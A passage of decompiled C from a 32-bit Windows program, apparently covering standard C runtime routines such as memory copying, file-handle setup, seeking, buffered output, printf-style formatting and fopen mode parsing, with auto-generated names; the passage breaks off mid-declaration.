    case 2:
      goto switchD_00417995_caseD_2;
    case 3:
      goto switchD_00417995_caseD_3;
    default:
      uVar1 = (param_3 - 4) + ((uint)param_1 & 3);
      switch((uint)param_1 & 3) {
      case 1:
        uVar2 = uVar1 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        uVar1 = uVar1 >> 2;
        *(undefined *)((int)param_1 + 2) = *(undefined *)((int)param_2 + 2);
        param_2 = (undefined4 *)((int)param_2 + 3);
        puVar3 = (undefined4 *)((int)param_1 + 3);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_00417995_caseD_2;
          case 3:
            goto switchD_00417995_caseD_3;
          }
          goto switchD_00417995_caseD_1;
        }
        break;
      case 2:
        uVar2 = uVar1 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        uVar1 = uVar1 >> 2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        param_2 = (undefined4 *)((int)param_2 + 2);
        puVar3 = (undefined4 *)((int)param_1 + 2);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_00417995_caseD_2;
          case 3:
            goto switchD_00417995_caseD_3;
          }
          goto switchD_00417995_caseD_1;
        }
        break;
      case 3:
        uVar2 = uVar1 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        param_2 = (undefined4 *)((int)param_2 + 1);
        uVar1 = uVar1 >> 2;
        puVar3 = (undefined4 *)((int)param_1 + 1);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_00417995_caseD_2;
          case 3:
            goto switchD_00417995_caseD_3;
          }
          goto switchD_00417995_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar1) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 7] = param_2[uVar1 - 7];
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 6] = param_2[uVar1 - 6];
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 5] = param_2[uVar1 - 5];
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 4] = param_2[uVar1 - 4];
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 3] = param_2[uVar1 - 3];
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 2] = param_2[uVar1 - 2];
  case 4:
  case 5:
  case 6:
  case 7:
    puVar3[uVar1 - 1] = param_2[uVar1 - 1];
    param_2 = param_2 + uVar1;
    puVar3 = puVar3 + uVar1;
  }
  switch(uVar2) {
  case 1:
switchD_00417995_caseD_1:
    *(undefined *)puVar3 = *(undefined *)param_2;
    return param_1;
  case 2:
switchD_00417995_caseD_2:
    *(undefined *)puVar3 = *(undefined *)param_2;
    *(undefined *)((int)puVar3 + 1) = *(undefined *)((int)param_2 + 1);
    return param_1;
  case 3:
switchD_00417995_caseD_3:
    *(undefined *)puVar3 = *(undefined *)param_2;
    *(undefined *)((int)puVar3 + 1) = *(undefined *)((int)param_2 + 1);
    *(undefined *)((int)puVar3 + 2) = *(undefined *)((int)param_2 + 2);
    return param_1;
  }
switchD_00417995_caseD_0:
  return param_1;
}



undefined4 __cdecl FUN_00417c95(undefined4 param_1)

{
  int iVar1;
  
  if (DAT_0042522c != (code *)0x0) {
    iVar1 = (*DAT_0042522c)(param_1);
    if (iVar1 != 0) {
      return 1;
    }
  }
  return 0;
}



void FUN_00417cb0(void)

{
  HANDLE *ppvVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  DWORD DVar5;
  HANDLE hFile;
  HANDLE *ppvVar6;
  int iVar7;
  UINT *pUVar8;
  UINT UVar9;
  UINT UVar10;
  uint uVar11;
  _STARTUPINFOA local_44;
  
  puVar3 = (undefined4 *)FUN_00415216((uint *)0x100);
  if (puVar3 == (undefined4 *)0x0) {
    FUN_004168e0(0x1b);
  }
  DAT_00426800 = 0x20;
  DAT_00426700 = puVar3;
  for (; puVar3 < DAT_00426700 + 0x40; puVar3 = puVar3 + 2) {
    *(undefined *)(puVar3 + 1) = 0;
    *puVar3 = 0xffffffff;
    *(undefined *)((int)puVar3 + 5) = 10;
  }
  GetStartupInfoA(&local_44);
  if ((local_44.cbReserved2 != 0) && ((UINT *)local_44.lpReserved2 != (UINT *)0x0)) {
    UVar9 = *(UINT *)local_44.lpReserved2;
    pUVar8 = (UINT *)((int)local_44.lpReserved2 + 4);
    ppvVar6 = (HANDLE *)(UVar9 + (int)pUVar8);
    if (0x7ff < (int)UVar9) {
      UVar9 = 0x800;
    }
    UVar10 = UVar9;
    if ((int)DAT_00426800 < (int)UVar9) {
      puVar3 = &DAT_00426704;
      do {
        puVar4 = (undefined4 *)FUN_00415216((uint *)0x100);
        UVar10 = DAT_00426800;
        if (puVar4 == (undefined4 *)0x0) break;
        DAT_00426800 = DAT_00426800 + 0x20;
        *puVar3 = puVar4;
        puVar2 = puVar4;
        for (; puVar4 < puVar2 + 0x40; puVar4 = puVar4 + 2) {
          *(undefined *)(puVar4 + 1) = 0;
          *puVar4 = 0xffffffff;
          *(undefined *)((int)puVar4 + 5) = 10;
          puVar2 = (undefined4 *)*puVar3;
        }
        puVar3 = puVar3 + 1;
        UVar10 = UVar9;
      } while ((int)DAT_00426800 < (int)UVar9);
    }
    uVar11 = 0;
    if (0 < (int)UVar10) {
      do {
        if (((*ppvVar6 != (HANDLE)0xffffffff) && ((*(byte *)pUVar8 & 1) != 0)) &&
           (((*(byte *)pUVar8 & 8) != 0 || (DVar5 = GetFileType(*ppvVar6), DVar5 != 0)))) {
          ppvVar1 = (HANDLE *)((int)(&DAT_00426700)[(int)uVar11 >> 5] + (uVar11 & 0x1f) * 8);
          *ppvVar1 = *ppvVar6;
          *(byte *)(ppvVar1 + 1) = *(byte *)pUVar8;
        }
        uVar11 = uVar11 + 1;
        pUVar8 = (UINT *)((int)pUVar8 + 1);
        ppvVar6 = ppvVar6 + 1;
      } while ((int)uVar11 < (int)UVar10);
    }
  }
  iVar7 = 0;
  do {
    ppvVar6 = (HANDLE *)(DAT_00426700 + iVar7 * 2);
    if (DAT_00426700[iVar7 * 2] == -1) {
      *(undefined *)(ppvVar6 + 1) = 0x81;
      if (iVar7 == 0) {
        DVar5 = 0xfffffff6;
      }
      else {
        DVar5 = 0xfffffff5 - (iVar7 != 1);
      }
      hFile = GetStdHandle(DVar5);
      if ((hFile != (HANDLE)0xffffffff) && (DVar5 = GetFileType(hFile), DVar5 != 0)) {
        *ppvVar6 = hFile;
        if ((DVar5 & 0xff) != 2) {
          if ((DVar5 & 0xff) == 3) {
            *(byte *)(ppvVar6 + 1) = *(byte *)(ppvVar6 + 1) | 8;
          }
          goto LAB_00417e41;
        }
      }
      *(byte *)(ppvVar6 + 1) = *(byte *)(ppvVar6 + 1) | 0x40;
    }
    else {
      *(byte *)(ppvVar6 + 1) = *(byte *)(ppvVar6 + 1) | 0x80;
    }
LAB_00417e41:
    iVar7 = iVar7 + 1;
    if (2 < iVar7) {
      SetHandleCount(DAT_00426800);
      return;
    }
  } while( true );
}



DWORD __cdecl FUN_00417e5b(uint param_1,LONG param_2,DWORD param_3)

{
  byte *pbVar1;
  HANDLE hFile;
  DWORD DVar2;
  uint uVar3;
  int iVar4;
  
  if (param_1 < DAT_00426800) {
    iVar4 = (param_1 & 0x1f) * 8;
    if ((*(byte *)((&DAT_00426700)[(int)param_1 >> 5] + 4 + iVar4) & 1) != 0) {
      hFile = (HANDLE)FUN_0041c36b(param_1);
      if (hFile == (HANDLE)0xffffffff) {
        DAT_00425194 = 9;
        return 0xffffffff;
      }
      DVar2 = SetFilePointer(hFile,param_2,(PLONG)0x0,param_3);
      if (DVar2 == 0xffffffff) {
        uVar3 = GetLastError();
      }
      else {
        uVar3 = 0;
      }
      if (uVar3 != 0) {
        FUN_0041a0e2(uVar3);
        return 0xffffffff;
      }
      pbVar1 = (byte *)((&DAT_00426700)[(int)param_1 >> 5] + 4 + iVar4);
      *pbVar1 = *pbVar1 & 0xfd;
      return DVar2;
    }
  }
  DAT_00425198 = 0;
  DAT_00425194 = 9;
  return 0xffffffff;
}



uint __cdecl FUN_00417ef5(uint param_1,char **param_2)

{
  char *pcVar1;
  char *pcVar2;
  char **ppcVar3;
  byte bVar4;
  undefined3 extraout_var;
  undefined *puVar5;
  char **ppcVar6;
  
  ppcVar3 = param_2;
  pcVar1 = param_2[3];
  pcVar2 = param_2[4];
  if ((((uint)pcVar1 & 0x82) == 0) || (((uint)pcVar1 & 0x40) != 0)) {
LAB_00417ffe:
    param_2[3] = (char *)((uint)pcVar1 | 0x20);
  }
  else {
    if (((uint)pcVar1 & 1) != 0) {
      param_2[1] = (char *)0x0;
      if (((uint)pcVar1 & 0x10) == 0) goto LAB_00417ffe;
      *param_2 = param_2[2];
      param_2[3] = (char *)((uint)pcVar1 & 0xfffffffe);
    }
    pcVar1 = param_2[3];
    param_2[1] = (char *)0x0;
    param_2 = (char **)0x0;
    ppcVar3[3] = (char *)((uint)pcVar1 & 0xffffffef | 2);
    if ((((uint)pcVar1 & 0x10c) == 0) &&
       (((ppcVar3 != (char **)&DAT_004088e0 && (ppcVar3 != (char **)&DAT_00408900)) ||
        (bVar4 = FUN_0041c443((uint)pcVar2), CONCAT31(extraout_var,bVar4) == 0)))) {
      FUN_0041c3ff(ppcVar3);
    }
    if ((*(ushort *)(ppcVar3 + 3) & 0x108) == 0) {
      ppcVar6 = (char **)0x1;
      param_2 = (char **)FUN_00419e88((DWORD)pcVar2,(char *)&param_1,1);
    }
    else {
      pcVar1 = ppcVar3[2];
      ppcVar6 = (char **)(*ppcVar3 + -(int)pcVar1);
      *ppcVar3 = pcVar1 + 1;
      ppcVar3[1] = ppcVar3[6] + -1;
      if ((int)ppcVar6 < 1) {
        if (pcVar2 == (char *)0xffffffff) {
          puVar5 = &DAT_00408710;
        }
        else {
          puVar5 = (undefined *)((&DAT_00426700)[(int)pcVar2 >> 5] + ((uint)pcVar2 & 0x1f) * 8);
        }
        if ((puVar5[4] & 0x20) != 0) {
          FUN_00417e5b((uint)pcVar2,0,2);
        }
      }
      else {
        param_2 = (char **)FUN_00419e88((DWORD)pcVar2,pcVar1,(uint)ppcVar6);
      }
      *ppcVar3[2] = (char)param_1;
    }
    if (param_2 == ppcVar6) {
      return param_1 & 0xff;
    }
    ppcVar3[3] = (char *)((uint)ppcVar3[3] | 0x20);
  }
  return 0xffffffff;
}



int __cdecl FUN_0041800a(char **param_1,byte *param_2,undefined4 *param_3)

{
  int iVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  undefined4 uVar5;
  short *psVar6;
  int *piVar7;
  LPSTR pCVar8;
  byte bVar9;
  int iVar10;
  uint uVar11;
  LPSTR pCVar12;
  ulonglong uVar13;
  undefined8 uVar14;
  ulonglong uVar15;
  undefined local_24c [511];
  undefined local_4d;
  undefined4 local_4c;
  undefined4 local_48;
  uint local_44;
  uint local_40;
  CHAR local_3c [4];
  undefined4 local_38;
  int local_34;
  int local_30;
  int local_2c;
  int local_28;
  int local_24;
  int local_20;
  char local_1a;
  char local_19;
  int local_18;
  int local_14;
  LPSTR local_10;
  uint *local_c;
  uint local_8;
  
  local_34 = 0;
  bVar9 = *param_2;
  param_2 = param_2 + 1;
  local_10 = (LPSTR)0x0;
  local_18 = 0;
  do {
    if ((bVar9 == 0) || (local_18 < 0)) {
      return local_18;
    }
    if (((char)bVar9 < ' ') || ('x' < (char)bVar9)) {
      uVar2 = 0;
    }
    else {
      uVar2 = *(byte *)((int)&PTR_FUN_004011dc + (int)(char)bVar9) & 0xf;
    }
    local_34 = (int)(char)(&DAT_004011fc)[uVar2 * 8 + local_34] >> 4;
    switch(local_34) {
    case 0:
switchD_00418078_caseD_0:
      local_28 = 0;
      if ((PTR_DAT_00408c00[(uint)bVar9 * 2 + 1] & 0x80) != 0) {
        FUN_0041874b((int)(char)bVar9,param_1,&local_18);
        bVar9 = *param_2;
        param_2 = param_2 + 1;
      }
      FUN_0041874b((int)(char)bVar9,param_1,&local_18);
      break;
    case 1:
      local_14 = -1;
      local_38 = 0;
      local_2c = 0;
      local_24 = 0;
      local_20 = 0;
      local_8 = 0;
      local_28 = 0;
      break;
    case 2:
      if (bVar9 == 0x20) {
        local_8 = local_8 | 2;
      }
      else if (bVar9 == 0x23) {
        local_8 = local_8 | 0x80;
      }
      else if (bVar9 == 0x2b) {
        local_8 = local_8 | 1;
      }
      else if (bVar9 == 0x2d) {
        local_8 = local_8 | 4;
      }
      else if (bVar9 == 0x30) {
        local_8 = local_8 | 8;
      }
      break;
    case 3:
      if (bVar9 == 0x2a) {
        local_24 = FUN_004187e9((int *)&param_3);
        if (local_24 < 0) {
          local_8 = local_8 | 4;
          local_24 = -local_24;
        }
      }
      else {
        local_24 = (char)bVar9 + -0x30 + local_24 * 10;
      }
      break;
    case 4:
      local_14 = 0;
      break;
    case 5:
      if (bVar9 == 0x2a) {
        local_14 = FUN_004187e9((int *)&param_3);
        if (local_14 < 0) {
          local_14 = -1;
        }
      }
      else {
        local_14 = (char)bVar9 + -0x30 + local_14 * 10;
      }
      break;
    case 6:
      if (bVar9 == 0x49) {
        if ((*param_2 != 0x36) || (param_2[1] != 0x34)) {
          local_34 = 0;
          goto switchD_00418078_caseD_0;
        }
        param_2 = param_2 + 2;
        local_8 = local_8 | 0x8000;
      }
      else if (bVar9 == 0x68) {
        local_8 = local_8 | 0x20;
      }
      else if (bVar9 == 0x6c) {
        local_8 = local_8 | 0x10;
      }
      else if (bVar9 == 0x77) {
        local_8 = local_8 | 0x800;
      }
      break;
    case 7:
      puVar4 = local_c;
      if ((char)bVar9 < 'h') {
        if ((char)bVar9 < 'e') {
          if ((char)bVar9 < 'Y') {
            if (bVar9 == 0x58) {
LAB_00418489:
              local_30 = 7;
LAB_00418490:
              local_10 = (LPSTR)0x10;
              if ((local_8 & 0x80) != 0) {
                local_1a = '0';
                local_19 = (char)local_30 + 'Q';
                local_20 = 2;
              }
              goto LAB_004184fa;
            }
            if (bVar9 != 0x43) {
              if ((bVar9 != 0x45) && (bVar9 != 0x47)) {
                if (bVar9 == 0x53) {
                  if ((local_8 & 0x830) == 0) {
                    local_8 = local_8 | 0x800;
                  }
                  goto LAB_00418237;
                }
                goto LAB_00418614;
              }
              local_38 = 1;
              bVar9 = bVar9 + 0x20;
              goto LAB_00418298;
            }
            if ((local_8 & 0x830) == 0) {
              local_8 = local_8 | 0x800;
            }
LAB_004182c5:
            if ((local_8 & 0x810) == 0) {
              uVar5 = FUN_004187e9((int *)&param_3);
              local_24c[0] = (char)uVar5;
              local_10 = (LPSTR)0x1;
            }
            else {
              uVar5 = FUN_00418806((int *)&param_3);
              local_10 = FUN_0041c469(local_24c,(WCHAR)uVar5);
              if ((int)local_10 < 0) {
                local_2c = 1;
              }
            }
            puVar4 = (uint *)local_24c;
          }
          else if (bVar9 == 0x5a) {
            psVar6 = (short *)FUN_004187e9((int *)&param_3);
            if ((psVar6 == (short *)0x0) || (puVar4 = *(uint **)(psVar6 + 2), puVar4 == (uint *)0x0)
               ) {
              local_c = (uint *)PTR_s__null__00408718;
              puVar4 = (uint *)PTR_s__null__00408718;
              goto LAB_0041840a;
            }
            if ((local_8 & 0x800) == 0) {
              local_28 = 0;
              local_10 = (LPSTR)(int)*psVar6;
            }
            else {
              local_28 = 1;
              local_10 = (LPSTR)((uint)(int)*psVar6 >> 1);
            }
          }
          else {
            if (bVar9 == 99) goto LAB_004182c5;
            if (bVar9 == 100) goto LAB_004184ef;
          }
        }
        else {
LAB_00418298:
          local_8 = local_8 | 0x40;
          puVar4 = (uint *)local_24c;
          if (local_14 < 0) {
            local_14 = 6;
          }
          else if ((local_14 == 0) && (bVar9 == 0x67)) {
            local_14 = 1;
          }
          local_4c = *param_3;
          local_48 = param_3[1];
          param_3 = param_3 + 2;
          local_c = puVar4;
          (*(code *)PTR_FUN_00408f30)(&local_4c,local_24c,(int)(char)bVar9,local_14,local_38);
          uVar2 = local_8 & 0x80;
          if ((uVar2 != 0) && (local_14 == 0)) {
            (*(code *)PTR_FUN_00408f3c)(local_24c);
          }
          if ((bVar9 == 0x67) && (uVar2 == 0)) {
            (*(code *)PTR_FUN_00408f34)(local_24c);
          }
          if (local_24c[0] == '-') {
            local_8 = local_8 | 0x100;
            puVar4 = (uint *)(local_24c + 1);
            local_c = puVar4;
          }
LAB_0041840a:
          local_10 = FUN_004194b0(puVar4);
          puVar4 = local_c;
        }
      }
      else {
        if (bVar9 == 0x69) {
LAB_004184ef:
          local_8 = local_8 | 0x40;
        }
        else {
          if (bVar9 == 0x6e) {
            piVar7 = (int *)FUN_004187e9((int *)&param_3);
            if ((local_8 & 0x20) == 0) {
              *piVar7 = local_18;
            }
            else {
              *(undefined2 *)piVar7 = (undefined2)local_18;
            }
            local_2c = 1;
            break;
          }
          if (bVar9 == 0x6f) {
            local_10 = (LPSTR)0x8;
            if ((local_8 & 0x80) != 0) {
              local_8 = local_8 | 0x200;
            }
            goto LAB_004184fa;
          }
          if (bVar9 == 0x70) {
            local_14 = 8;
            goto LAB_00418489;
          }
          if (bVar9 == 0x73) {
LAB_00418237:
            iVar10 = local_14;
            if (local_14 == -1) {
              iVar10 = 0x7fffffff;
            }
            puVar3 = (uint *)FUN_004187e9((int *)&param_3);
            if ((local_8 & 0x810) == 0) {
              puVar4 = puVar3;
              if (puVar3 == (uint *)0x0) {
                puVar3 = (uint *)PTR_s__null__00408718;
                puVar4 = (uint *)PTR_s__null__00408718;
              }
              for (; (iVar10 != 0 && (*(char *)puVar3 != '\0')); puVar3 = (uint *)((int)puVar3 + 1))
              {
                iVar10 = iVar10 + -1;
              }
              local_10 = (LPSTR)((int)puVar3 - (int)puVar4);
            }
            else {
              if (puVar3 == (uint *)0x0) {
                puVar3 = (uint *)PTR_DAT_0040871c;
              }
              local_28 = 1;
              for (puVar4 = puVar3; (iVar10 != 0 && (*(WCHAR *)puVar4 != L'\0'));
                  puVar4 = (uint *)((int)puVar4 + 2)) {
                iVar10 = iVar10 + -1;
              }
              local_10 = (LPSTR)((int)puVar4 - (int)puVar3 >> 1);
              puVar4 = puVar3;
            }
            goto LAB_00418614;
          }
          if (bVar9 != 0x75) {
            if (bVar9 != 0x78) goto LAB_00418614;
            local_30 = 0x27;
            goto LAB_00418490;
          }
        }
        local_10 = (LPSTR)0xa;
LAB_004184fa:
        if ((local_8 & 0x8000) == 0) {
          if ((local_8 & 0x20) == 0) {
            if ((local_8 & 0x40) == 0) {
              uVar2 = FUN_004187e9((int *)&param_3);
              uVar13 = (ulonglong)uVar2;
              goto LAB_0041854d;
            }
            uVar2 = FUN_004187e9((int *)&param_3);
          }
          else if ((local_8 & 0x40) == 0) {
            uVar2 = FUN_004187e9((int *)&param_3);
            uVar2 = uVar2 & 0xffff;
          }
          else {
            uVar5 = FUN_004187e9((int *)&param_3);
            uVar2 = (uint)(short)uVar5;
          }
          uVar13 = (ulonglong)(int)uVar2;
        }
        else {
          uVar13 = FUN_004187f6((int *)&param_3);
        }
LAB_0041854d:
        iVar10 = (int)(uVar13 >> 0x20);
        if ((((local_8 & 0x40) != 0) && (iVar10 == 0 || (longlong)uVar13 < 0)) &&
           ((longlong)uVar13 < 0)) {
          local_8 = local_8 | 0x100;
          uVar13 = CONCAT44(-(iVar10 + (uint)((int)uVar13 != 0)),-(int)uVar13);
        }
        uVar2 = (uint)(uVar13 >> 0x20);
        uVar15 = uVar13 & 0xffffffff;
        if ((local_8 & 0x8000) == 0) {
          uVar2 = 0;
        }
        if (local_14 < 0) {
          local_14 = 1;
        }
        else {
          local_8 = local_8 & 0xfffffff7;
        }
        if (((uint)uVar13 | uVar2) == 0) {
          local_20 = 0;
        }
        local_c = (uint *)&local_4d;
        while( true ) {
          uVar11 = (uint)uVar15;
          iVar10 = local_14 + -1;
          if ((local_14 < 1) && ((uVar11 | uVar2) == 0)) break;
          local_40 = (int)local_10 >> 0x1f;
          local_44 = (uint)local_10;
          local_14 = iVar10;
          uVar14 = FUN_0041b540(uVar11,uVar2,(uint)local_10,local_40);
          iVar10 = (int)uVar14 + 0x30;
          uVar15 = FUN_0041b4d0(uVar11,uVar2,local_44,local_40);
          uVar2 = (uint)(uVar15 >> 0x20);
          if (0x39 < iVar10) {
            iVar10 = iVar10 + local_30;
          }
          puVar4 = (uint *)((int)local_c + -1);
          *(char *)local_c = (char)iVar10;
          local_c = puVar4;
        }
        iVar1 = -(int)local_c;
        local_10 = &local_4d + iVar1;
        puVar4 = (uint *)((int)local_c + 1);
        local_14 = iVar10;
        if (((local_8 & 0x200) != 0) && ((*(char *)puVar4 != '0' || (local_10 == (LPSTR)0x0)))) {
          *(char *)local_c = '0';
          local_10 = (LPSTR)((int)&local_4c + iVar1);
          puVar4 = local_c;
        }
      }
LAB_00418614:
      local_c = puVar4;
      uVar2 = local_8;
      if (local_2c == 0) {
        if ((local_8 & 0x40) != 0) {
          if ((local_8 & 0x100) == 0) {
            if ((local_8 & 1) == 0) {
              if ((local_8 & 2) == 0) goto LAB_0041864c;
              local_1a = ' ';
            }
            else {
              local_1a = '+';
            }
          }
          else {
            local_1a = '-';
          }
          local_20 = 1;
        }
LAB_0041864c:
        iVar10 = (local_24 - local_20) - (int)local_10;
        if ((local_8 & 0xc) == 0) {
          FUN_00418780(0x20,iVar10,param_1,&local_18);
        }
        FUN_004187b1(&local_1a,local_20,param_1,&local_18);
        if (((uVar2 & 8) != 0) && ((uVar2 & 4) == 0)) {
          FUN_00418780(0x30,iVar10,param_1,&local_18);
        }
        if ((local_28 == 0) || (pCVar12 = local_10, puVar4 = local_c, (int)local_10 < 1)) {
          FUN_004187b1((char *)local_c,(int)local_10,param_1,&local_18);
        }
        else {
          do {
            pCVar12 = pCVar12 + -1;
            pCVar8 = FUN_0041c469(local_3c,*(WCHAR *)puVar4);
            if ((int)pCVar8 < 1) break;
            FUN_004187b1(local_3c,(int)pCVar8,param_1,&local_18);
            puVar4 = (uint *)((int)puVar4 + 2);
          } while (pCVar12 != (LPSTR)0x0);
        }
        if ((local_8 & 4) != 0) {
          FUN_00418780(0x20,iVar10,param_1,&local_18);
        }
      }
    }
    bVar9 = *param_2;
    param_2 = param_2 + 1;
  } while( true );
}



void __cdecl FUN_0041874b(uint param_1,char **param_2,int *param_3)

{
  char **ppcVar1;
  uint uVar2;
  
  ppcVar1 = param_2 + 1;
  *ppcVar1 = *ppcVar1 + -1;
  if ((int)*ppcVar1 < 0) {
    uVar2 = FUN_00417ef5(param_1,param_2);
  }
  else {
    **param_2 = (char)param_1;
    *param_2 = *param_2 + 1;
    uVar2 = param_1 & 0xff;
  }
  if (uVar2 == 0xffffffff) {
    *param_3 = -1;
    return;
  }
  *param_3 = *param_3 + 1;
  return;
}



void __cdecl FUN_00418780(uint param_1,int param_2,char **param_3,int *param_4)

{
  if (0 < param_2) {
    do {
      param_2 = param_2 + -1;
      FUN_0041874b(param_1,param_3,param_4);
      if (*param_4 == -1) {
        return;
      }
    } while (0 < param_2);
  }
  return;
}



void __cdecl FUN_004187b1(char *param_1,int param_2,char **param_3,int *param_4)

{
  char cVar1;
  
  if (0 < param_2) {
    do {
      param_2 = param_2 + -1;
      cVar1 = *param_1;
      param_1 = param_1 + 1;
      FUN_0041874b((int)cVar1,param_3,param_4);
      if (*param_4 == -1) {
        return;
      }
    } while (0 < param_2);
  }
  return;
}



undefined4 __cdecl FUN_004187e9(int *param_1)

{
  *param_1 = *param_1 + 4;
  return *(undefined4 *)(*param_1 + -4);
}



undefined8 __cdecl FUN_004187f6(int *param_1)

{
  *param_1 = *param_1 + 8;
  return *(undefined8 *)(*param_1 + -8);
}



undefined4 __cdecl FUN_00418806(int *param_1)

{
  *param_1 = *param_1 + 4;
  return CONCAT22((short)((uint)*param_1 >> 0x10),*(undefined2 *)(*param_1 + -4));
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 * __cdecl FUN_00418814(LPCSTR param_1,char *param_2,uint param_3,undefined4 *param_4)

{
  char cVar1;
  bool bVar2;
  bool bVar3;
  bool bVar4;
  uint uVar5;
  uint uVar6;
  
  bVar4 = false;
  bVar3 = false;
  cVar1 = *param_2;
  if (cVar1 == 'a') {
    uVar5 = 0x109;
  }
  else {
    if (cVar1 == 'r') {
      uVar5 = 0;
      uVar6 = DAT_00425270 | 1;
      goto LAB_00418855;
    }
    if (cVar1 != 'w') {
      return (undefined4 *)0x0;
    }
    uVar5 = 0x301;
  }
  uVar6 = DAT_00425270 | 2;
LAB_00418855:
  bVar2 = true;
LAB_00418858:
  cVar1 = param_2[1];
  param_2 = param_2 + 1;
  if ((cVar1 == '\0') || (!bVar2)) {
    uVar5 = FUN_0041a932(param_1,uVar5,param_3,0x1a4);
    if ((int)uVar5 < 0) {
      return (undefined4 *)0x0;
    }
    _DAT_00425240 = _DAT_00425240 + 1;
    param_4[3] = uVar6;
    param_4[1] = 0;
    *param_4 = 0;
    param_4[2] = 0;
    param_4[7] = 0;
    param_4[4] = uVar5;
    return param_4;
  }
  if (cVar1 < 'U') {
    if (cVar1 == 'T') {
      if ((uVar5 & 0x1000) == 0) {
        uVar5 = uVar5 | 0x1000;
        goto LAB_00418858;
      }
    }
    else if (cVar1 == '+') {
      if ((uVar5 & 2) == 0) {
        uVar5 = uVar5 & 0xfffffffe | 2;
        uVar6 = uVar6 & 0xfffffffc | 0x80;
        goto LAB_00418858;
      }
    }
    else if (cVar1 == 'D') {
      if ((uVar5 & 0x40) == 0) {
        uVar5 = uVar5 | 0x40;
        goto LAB_00418858;
      }
    }
    else if (cVar1 == 'R') {
      if (!bVar3) {
        bVar3 = true;
        uVar5 = uVar5 | 0x10;
        goto LAB_00418858;
      }
    }
    else if ((cVar1 == 'S') && (!bVar3)) {
      bVar3 = true;
      uVar5 = uVar5 | 0x20;
      goto LAB_00418858;
    }
  }
  else {
    if (cVar1 == 'b') {
      if ((uVar5 & 0xc000) != 0) goto LAB_00418938;
      uVar5 = uVar5 | 0x8000;
      goto LAB_00418858;
    }
    if (cVar1 == 'c') {
      if (!bVar4) {
        bVar4 = true;
        uVar6 = uVar6 | 0x4000;
        goto LAB_00418858;
      }
    }
    else {
      if (cVar1 != 'n') {
        if ((cVar1 != 't') || ((uVar5 & 0xc000) != 0)) goto LAB_00418938;
        uVar5 = uVar5 | 0x4000;
        goto LAB_00418858;
      }
      if (!bVar4) {
        bVar4 = true;
        uVar6 = uVar6 & 0xffffbfff;
        goto LAB_00418858;
      }
    }
  }
LAB_00418938:
  bVar2 = false;
  goto LAB_00418858;
}



undefined4 * FUN_00418984(void)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  int *piVar4;
  
  iVar1 = 0;
  piVar4 = DAT_004256c8;
  if (0 < DAT_004266e0) {
    do {
      if (*piVar4 == 0) {
        iVar2 = FUN_00415216((uint *)0x20);
        DAT_004256c8[iVar1] = iVar2;
        puVar3 = (undefined4 *)DAT_004256c8[iVar1];
        if (puVar3 == (undefined4 *)0x0) {
          return (undefined4 *)0x0;
        }
LAB_004189df:
        if (puVar3 == (undefined4 *)0x0) {
          return (undefined4 *)0x0;
        }
        puVar3[4] = 0xffffffff;
        puVar3[1] = 0;
        puVar3[3] = 0;
        puVar3[2] = 0;
        *puVar3 = 0;
        puVar3[7] = 0;
        return puVar3;
      }
      if ((*(byte *)(*piVar4 + 0xc) & 0x83) == 0) {
        puVar3 = (undefined4 *)DAT_004256c8[iVar1];
        goto LAB_004189df;
      }
      iVar1 = iVar1 + 1;
      piVar4 = piVar4 + 1;
    } while (iVar1 < DAT_004266e0);
  }
  return (undefined4 *)0x0;
}



int __thiscall FUN_004189fc(void *this,byte **param_1,byte *param_2,undefined4 *param_3)

{
  byte bVar1;
  byte **ppbVar2;
  byte bVar3;
  uint uVar4;
  uint uVar5;
  void *this_00;
  byte **extraout_ECX;
  byte **extraout_ECX_00;
  byte **extraout_ECX_01;
  void *this_01;
  byte **extraout_ECX_02;
  byte **extraout_ECX_03;
  byte **ppbVar6;
  byte bVar7;
  byte *pbVar8;
  byte *pbVar9;
  char *pcVar10;
  char *pcVar11;
  undefined4 *puVar12;
  undefined *puVar13;
  int iVar14;
  bool bVar15;
  byte **ppbVar16;
  char local_1c8;
  char local_1c7 [351];
  uint local_68 [2];
  undefined local_5d;
  undefined4 *local_48;
  WCHAR local_42;
  uint local_40;
  byte local_3c;
  undefined local_3b;
  byte local_39;
  int local_38;
  undefined4 *local_34;
  undefined4 *local_30;
  undefined8 local_2c;
  int local_24;
  int local_20;
  byte local_1c;
  char local_1b;
  char local_1a;
  char local_19;
  byte **local_18;
  char local_13;
  char local_12;
  char local_11;
  int local_10;
  char local_9;
  undefined *local_8;
  
